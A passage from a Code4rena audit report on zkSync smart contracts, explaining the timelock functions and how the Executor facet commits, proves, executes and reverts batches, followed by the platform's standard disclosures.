        if (!success) {
            assembly {
                revert(add(returnData, 0x20), mload(returnData))
            }
        }
    }
}
```

The `_checkPredecessorDone()` function takes in a `_predecessorId` in `bytes32` format, to verify whether the predecessor operation is completed or not. It is an internal view function.

1. The function implements a require check where `_predecessorId` cannot equal `0` in bytes32 format, and checks (via logical OR) whether the operation is done or not.

The `updateDelay` function allows the contract (via the `onlySelf` modifier) to update the minimum timelock duration for future operations. Realistically, this should not mess with current operations according to the code logic. The function takes in a `_newDelay` in `uint256` format.

1. Emits the change from `minDelay` to `_newDelay`.
2. `minDelay` is set to `_newDelay`.

The `updateSecurityCouncil` function is responsible for simply updating the address of the multi-sig security council. This function has a `onlySelf` modifier therefore it has to be equal to `msg.sender`.

1. Emits change via `ChangeSecurityCouncil` from `securityCouncil` to `_newSecurityCouncil`.
2. `securityCouncil` is set to `_newSecurityCouncil`.

## Executor Facet Exploration

During the course of the audit, the Executor facet within the Diamond contracts was the subject of major focus. To build a model for the rest of the team, the functions and their place in the greater system was considered and documented.

### CommitBatches

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/1117).*

`commitBatches` takes in the last confirmed batch data along with new batch data. Depending on whether a system contract upgrade is present and the upgrade batch number, it invokes either `_commitBatchesWithoutSystemContractsUpgrade` or `_commitBatchesWithSystemContractsUpgrade` to commit the new batches.

Both `_commitBatchesWithoutSystemContractsUpgrade` and `_commitBatchesWithSystemContractsUpgrade` iterates through the new batches data. They process each batch individually by calling `_commitOneBatch` and then store the hash of the stored batch information.

The `_commitOneBatch` performs these steps:

- Checks if the new batch number is the next one after the last committed batch number.
- Processes the L2 logs in the new batch by invoking `_processL2Logs`.
- Verifies the timestamp of the new batch.
- Creates a batch commitment and returns a new `StoredBatchInfo`.

`_processL2Logs` iterates through each log in the new batch. It verifies the sender address, the log key, and the log value, and ensures each log is processed exactly once.

### ExecuteBatches 

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/1117).*

`executeBatches` takes an array of batch data. It loops over each batch and calls `_executeOneBatch` to process each batch individually. After processing each batch, a `BlockExecution` event is emitted.

It updates the total number of executed batches. If this total exceeds the total number of verified batches, an error is thrown.

If a system contract upgrade has occurred and all batches up to and including the upgrade batch have been executed, the function clears the system contract upgrade transaction hash and batch number.

`_executeOneBatch` checks the batch is in the correct execution order and verifies it has been committed. It processes all pending operations by calling `_collectOperationsFromPriorityQueue` and verifies the hash of priority operations matches the expected hash. It then saves the root hash of the L2 to L1 logs tree.

`_collectOperationsFromPriorityQueue` removes priority operations from the priority queue and returns a rolling hash of operations.

### ProveBatches 

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/1117).*

`proveBatches` is invoked with the previous batch data, an array of committed batches, and a proof.

- Verifies that the hash of the previous batch matches the hash of the first unverified batch in the stored batch hashes.
- For each committed batch, it checks the hash of the batch against the corresponding hash in the stored batch hashes.
- Generates a public input for the zk proof using the previous batch commitment, the current batch commitment, and the verifier parameters.
- After all batches have been processed, the function ensures that the total number of verified batches does not exceed the total number of committed batches.
- The zk proof is verified using the generated public inputs, the provided serialized proof, and the recursive aggregation input.
- If there is an issue with verification then an error is thrown and at last a `BlocksVerification` event is emitted with total number of verified batches (including both old and new), and the total number of verified batches is updated.

### RevertBatches 

The `revertBatches` reverts unexecuted batches. It accepts a batch number, representing the batch number after which batches should be reverted. The function does not delete the stored data about batches but only decreases the counters responsible for the number of batches. A `BlocksRevert` event is triggered after the reversal.

### Time spent

100 hours

**[miladpiri (zkSync) acknowledged](https://github.com/code-423n4/2023-10-zksync-findings/issues/1117#issuecomment-1795891572)**

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
